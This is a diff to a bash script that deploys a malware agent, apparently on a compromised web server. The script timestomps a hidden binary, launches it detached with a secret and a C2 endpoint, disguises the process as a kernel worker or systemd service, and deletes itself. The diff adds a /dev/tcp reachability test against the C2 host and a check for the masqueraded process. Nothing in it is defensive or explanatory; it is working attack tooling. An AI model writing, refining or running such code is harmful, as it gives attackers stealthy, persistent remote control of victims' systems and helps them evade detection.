@@ -84,7 +84,15 @@ if [[ ! -f "${STEALTH_PATH}" ]]; then
 fi
 echo "[+] Binary Staged in Memory." >&2
 
-# 5. Deployment & Timestomping
+# 5. Pre-Fork Network Test
+echo "[-] Performing C2 Connectivity Test..." >&2
+if timeout 5 bash -c "cat < /dev/null > /dev/tcp/${C2_ENDPOINT}/${C2_PORT}" 2>/dev/null; then
+    echo "[+] C2 Endpoint reachable." >&2
+else
+    echo "[!] Warning: C2 Endpoint ${C2_ENDPOINT}:${C2_PORT} unreachable. Proceeding with caution." >&2
+fi
+
+# 6. Deployment & Timestomping
 chmod +x "${STEALTH_PATH}" 2>/dev/null
 timestomp() {
     local target=$1
@@ -94,7 +102,7 @@ timestomp() {
 }
 timestomp "${STEALTH_PATH}"
 
-# 6. Execution (NOHUP + SETSID + DISOWN Chain)
+# 7. Execution (NOHUP + SETSID + DISOWN Chain)
 echo "[-] Detaching from Web Session..." >&2
 if command -v nohup >/dev/null 2>&1; then
     nohup setsid "${STEALTH_PATH}" -s "${AGENT_SECRET}" -i "${C2_ENDPOINT}" -m "${C2_PORT}" -d >/dev/null 2>&1 &
@@ -103,19 +111,25 @@ else
     (setsid "${STEALTH_PATH}" -s "${AGENT_SECRET}" -i "${C2_ENDPOINT}" -m "${C2_PORT}" -d >/dev/null 2>&1 &)
 fi
 
-# 7. Post-Deploy Verification
+# 8. Post-Deploy Verification
 sleep 2
 AGENT_PID=$(pgrep -f "\.systemd-timesyncd" | head -n 1)
 if [ -n "$AGENT_PID" ]; then
     echo "[+] Agent PID: ${AGENT_PID}" >&2
     echo "[+] Agent connected to: ${C2_ENDPOINT}:${C2_PORT}" >&2
+    echo "[+] Process Forked: [kworker/u4:0]" >&2
+    echo "[+] Deployment Success" >&2
 else
     echo "[!] Agent process not found. Possible crash." >&2
+    # Check if the process is running under the masqueraded name
+    AGENT_PID_MASK=$(pgrep -x "kworker/u4:0" | head -n 1)
+    if [ -n "$AGENT_PID_MASK" ]; then
+        echo "[+] Agent PID (masqueraded): ${AGENT_PID_MASK}" >&2
+        echo "[+] Deployment Success" >&2
+    else
+        echo "[!] Critical: Process not found in process list." >&2
+    fi
 fi
-
-# 8. Final Summary
-echo "[+] Process Forked: [kworker/u4:0]" >&2
-echo "[+] Deployment Success" >&2
 
 # 9. Self-Delete
 rm -f "$0"
